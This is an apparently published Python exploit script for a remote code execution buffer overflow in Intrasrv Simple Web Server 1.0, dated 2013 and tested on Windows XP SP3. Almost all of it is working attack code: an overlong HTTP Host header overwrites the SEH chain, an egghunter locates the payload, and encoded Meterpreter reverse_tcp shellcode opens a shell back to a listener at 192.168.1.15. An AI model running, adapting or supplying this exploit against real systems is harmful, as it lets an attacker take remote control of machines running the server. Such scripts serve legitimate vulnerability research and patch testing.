# Exploit Title: Intrasrv Simple Web Server 1.0 SEH based Remote Code Execution BOF

# Date: 29.05.2013

# Exploit Author: xis_one@STM Solutions

# Vendor Homepage: http://www.leighb.com/intrasrv.htm

# Software Link: http://www.leighb.com/intrasrv.zip

# Version: 1.0

# Tested on: Windows XP SP3 Eng


# Movie:http://www.youtube.com/watch?v=NvCPYA6T9l0&feature=youtu.be



#!/usr/bin/python

import socket

import os

import sys



target="192.168.1.16"


#W00T

egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7" + "\x90"*94

nseh="\xEB\x80\x90\x90"#jmp back do egghunter

seh="\xdd\x97\x40\x00"  #0x004097dd, # pop eax # pop ebp # ret  - intrasrv.exe

crash = "\x90"*1427 + egghunter + nseh + seh + "\x90"*2439 #4000 bytes


#windows/meterpreter/reverse_tcp lhost=192.168.1.15 lport=31337 R | msfencode -t c -b '\x56' -e x86/alpha_mixed

shellcode = ("T00WT00W" +

"\x89\xe2\xda\xcf\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49\x49"

"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"

"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"

"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"

"\x59\x6c\x4b\x58\x4e\x69\x47\x70\x55\x50\x53\x30\x75\x30\x4e"

"\x69\x6b\x55\x64\x71\x78\x52\x73\x54\x4e\x6b\x51\x42\x64\x70"

"\x4e\x6b\x32\x72\x44\x4c\x6e\x6b\x62\x72\x45\x44\x6c\x4b\x30"

"\x72\x77\x58\x36\x6f\x38\x37\x32\x6a\x74\x66\x65\x61\x79\x6f"

"\x70\x31\x49\x50\x4c\x6c\x47\x4c\x63\x51\x51\x6c\x65\x52\x66"

"\x4c\x71\x30\x4b\x71\x48\x4f\x44\x4d\x55\x51\x6a\x67\x69\x72"

"\x4c\x30\x31\x42\x46\x37\x4c\x4b\x33\x62\x36\x70\x6e\x6b\x50"

"\x42\x75\x6c\x66\x61\x6a\x70\x6e\x6b\x47\x30\x51\x68\x4e\x65"

"\x69\x50\x42\x54\x71\x5a\x35\x51\x38\x50\x52\x70\x6c\x4b\x32"

"\x68\x67\x68\x4c\x4b\x71\x48\x35\x70\x77\x71\x39\x43\x58\x63"

"\x47\x4c\x47\x39\x4c\x4b\x37\x44\x4e\x6b\x65\x51\x79\x46\x30"

"\x31\x49\x6f\x46\x51\x59\x50\x4e\x4c\x59\x51\x4a\x6f\x64\x4d"

"\x36\x61\x5a\x67\x30\x38\x49\x70\x34\x35\x4a\x54\x55\x53\x61"

"\x6d\x39\x68\x47\x4b\x73\x4d\x37\x54\x32\x55\x59\x72\x63\x68"

"\x4c\x4b\x32\x78\x57\x54\x63\x31\x59\x43\x31\x76\x6c\x4b\x36"

"\x6c\x72\x6b\x4e\x6b\x33\x68\x65\x4c\x65\x51\x4a\x73\x6c\x4b"

"\x44\x44\x6c\x4b\x36\x61\x4a\x70\x6c\x49\x61\x54\x64\x64\x66"

"\x44\x61\x4b\x31\x4b\x65\x31\x52\x79\x51\x4a\x62\x71\x69\x6f"

"\x49\x70\x46\x38\x33\x6f\x53\x6a\x4e\x6b\x67\x62\x58\x6b\x4e"

"\x66\x53\x6d\x35\x38\x45\x63\x55\x62\x33\x30\x67\x70\x33\x58"

"\x53\x47\x64\x33\x54\x72\x31\x4f\x33\x64\x72\x48\x42\x6c\x31"

"\x67\x65\x76\x73\x37\x6b\x4f\x39\x45\x4d\x68\x5a\x30\x47\x71"

"\x37\x70\x77\x70\x74\x69\x59\x54\x62\x74\x42\x70\x42\x48\x64"

"\x69\x4b\x30\x30\x6b\x37\x70\x79\x6f\x58\x55\x32\x70\x42\x70"

"\x30\x50\x76\x30\x37\x30\x42\x70\x77\x30\x72\x70\x63\x58\x4b"

"\x5a\x34\x4f\x39\x4f\x79\x70\x79\x6f\x4e\x35\x6d\x47\x33\x5a"

"\x34\x45\x71\x78\x4b\x70\x6f\x58\x57\x71\x46\x6f\x42\x48\x54"

"\x42\x47\x70\x43\x4a\x72\x49\x4e\x69\x6a\x46\x31\x7a\x34\x50"

"\x31\x46\x70\x57\x73\x58\x6e\x79\x4f\x55\x63\x44\x35\x31\x6b"

"\x4f\x69\x45\x4d\x55\x6b\x70\x44\x34\x74\x4c\x6b\x4f\x50\x4e"

"\x67\x78\x71\x65\x4a\x4c\x63\x58\x58\x70\x38\x35\x49\x32\x51"

"\x46\x59\x6f\x6e\x35\x51\x7a\x63\x30\x70\x6a\x66\x64\x53\x66"

"\x50\x57\x45\x38\x44\x42\x39\x49\x68\x48\x43\x6f\x4b\x4f\x6e"

"\x35\x4c\x4b\x64\x76\x30\x6a\x73\x70\x33\x58\x73\x30\x66\x70"

"\x67\x70\x55\x50\x72\x76\x42\x4a\x67\x70\x75\x38\x63\x68\x69"

"\x34\x50\x53\x68\x65\x4b\x4f\x49\x45\x7a\x33\x71\x43\x73\x5a"

"\x57\x70\x73\x66\x61\x43\x42\x77\x50\x68\x63\x32\x6b\x69\x79"

"\x58\x31\x4f\x39\x6f\x4a\x75\x35\x51\x4f\x33\x36\x49\x38\x46"

"\x4c\x45\x59\x66\x42\x55\x4a\x4c\x4f\x33\x41\x41")


buffer="GET / HTTP/1.1\r\n"

buffer+="Host: " + crash + "\r\n"

buffer+="Content-Type: application/x-www-form-urlencoded\r\n"

buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n"

buffer+="Content-Length: 1048580\r\n\r\n"

buffer+=shellcode

one = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )

one.connect((target, 80))

one.send(buffer)

one.close()